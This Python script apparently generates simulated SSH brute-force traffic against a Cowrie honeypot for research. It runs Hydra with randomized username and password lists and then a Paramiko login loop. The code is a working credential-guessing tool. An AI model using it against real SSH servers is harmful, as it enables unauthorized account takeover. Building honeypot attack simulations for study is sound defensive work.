#!/usr/bin/env python3
"""
attacks/brute_force.py — SSH brute-force attack simulation.

Uses both Hydra (external tool) and a Paramiko loop to hammer the
honeypot with credential guesses. Wordlist size, thread count, delays,
and username lists are all randomised from the seed.
"""

import argparse
import os
import random
import subprocess
import sys
import tempfile
import time

import paramiko

from common import (
    COMMON_PASSWORDS,
    COMMON_USERNAMES,
    VALID_CREDENTIALS,
    validate_target,
)


def generate_wordlist(rng: random.Random, size: int,
                      include_valid: bool) -> tuple[list[str], list[str]]:
    """Return (usernames, passwords) lists of the requested *size*.

    If *include_valid* is True, one known-good Cowrie credential pair
    is inserted at a random position so the attack eventually succeeds.
    """
    usernames = rng.choices(COMMON_USERNAMES, k=min(size, len(COMMON_USERNAMES)))
    passwords = rng.choices(COMMON_PASSWORDS, k=size)

    if include_valid:
        valid_user, valid_pass = rng.choice(VALID_CREDENTIALS)
        # Make sure the valid user is in the username list
        if valid_user not in usernames:
            usernames[rng.randint(0, len(usernames) - 1)] = valid_user
        # Insert the valid password at a random position
        pos = rng.randint(0, len(passwords) - 1)
        passwords[pos] = valid_pass

    return usernames, passwords


def write_wordlist_file(items: list[str], prefix: str) -> str:
    """Write items to a temp file and return its path."""
    fd, path = tempfile.mkstemp(prefix=prefix, suffix=".txt")
    with os.fdopen(fd, "w") as f:
        for item in items:
            f.write(item + "\n")
    return path


def hydra_attack(target: str, port: int, usernames: list[str],
                 passwords: list[str], threads: int,
                 rng: random.Random) -> None:
    """Run Hydra SSH brute force."""
    user_file = write_wordlist_file(usernames, "users_")
    pass_file = write_wordlist_file(passwords, "pass_")

    cmd = [
        "hydra",
        "-L", user_file,
        "-P", pass_file,
        "-t", str(threads),
        "-s", str(port),
        "-e", "nsr",       # try null, same-as-user, reversed
        "-f",              # exit on first success
        target, "ssh",
    ]
    print(f"  [hydra] threads={threads}  users={len(usernames)}  "
          f"passwords={len(passwords)}")
    print(f"  [hydra] {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, timeout=180, capture_output=True, text=True)
        # Print last few lines of output for debugging
        for line in result.stdout.strip().split("\n")[-5:]:
            print(f"  [hydra] {line}")
    except subprocess.TimeoutExpired:
        print("  [hydra] timed out after 180 s")
    except FileNotFoundError:
        print("  [hydra] hydra not found — skipping", file=sys.stderr)
    finally:
        os.unlink(user_file)
        os.unlink(pass_file)


def paramiko_bruteforce(target: str, port: int, usernames: list[str],
                        passwords: list[str], delay: float,
                        rng: random.Random) -> None:
    """Paramiko-based credential spray."""
    pairs = [(u, p) for u in usernames for p in passwords]
    rng.shuffle(pairs)

    # Limit to a reasonable subset so we don't run forever
    max_attempts = min(len(pairs), 200)
    pairs = pairs[:max_attempts]

    print(f"  [paramiko] attempts={len(pairs)}  delay={delay:.2f}s")
    for username, password in pairs:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=target, port=port,
                username=username, password=password,
                timeout=5, look_for_keys=False, allow_agent=False,
                banner_timeout=10,
            )
            print(f"    [+] SUCCESS: {username}:{password}")
            client.close()
            # Sometimes keep trying after success, sometimes stop
            if rng.random() < 0.5:
                break
        except paramiko.AuthenticationException:
            pass
        except Exception as exc:
            print(f"    [!] Error: {exc}", file=sys.stderr)
        finally:
            client.close()
        time.sleep(delay + rng.uniform(0, delay * 0.5))


def run(target: str, port: int, seed: int,
        wordlist_size: int, threads: int) -> dict:
    """Execute a brute-force campaign with Hydra and Paramiko."""
    rng = random.Random(seed)

    # Decide whether a valid credential is included (≈40% chance)
    include_valid = rng.random() < 0.4
    usernames, passwords = generate_wordlist(rng, wordlist_size, include_valid)

    # Phase A: Hydra (if available)
    hydra_attack(target, port, usernames, passwords, threads, rng)

    # Brief pause between tools
    time.sleep(rng.uniform(1.0, 3.0))

    # Phase B: Paramiko loop with a different shuffled subset
    delay = rng.uniform(0.05, 0.5)
    paramiko_bruteforce(target, port, usernames, passwords, delay, rng)

    return {
        "wordlist_size": wordlist_size,
        "threads": threads,
        "include_valid_cred": include_valid,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="SSH brute-force simulation")
    parser.add_argument("--target", required=True)
    parser.add_argument("--port",   type=int, default=2222)
    parser.add_argument("--seed",   type=int, required=True)
    parser.add_argument("--wordlist-size", type=int, default=0,
                        help="Password list size (0 = random 10-300)")
    parser.add_argument("--threads", type=int, default=0,
                        help="Hydra threads (0 = random 1-16)")
    args = parser.parse_args()

    validate_target(args.target)

    rng = random.Random(args.seed)
    wordlist_size = args.wordlist_size if args.wordlist_size > 0 else rng.randint(10, 300)
    threads       = args.threads       if args.threads       > 0 else rng.randint(1, 16)

    print(f"[brute_force] seed={args.seed}  wordlist={wordlist_size}  threads={threads}")
    result = run(args.target, args.port, args.seed, wordlist_size, threads)
    print(f"[brute_force] Done. {result}")


if __name__ == "__main__":
    main()
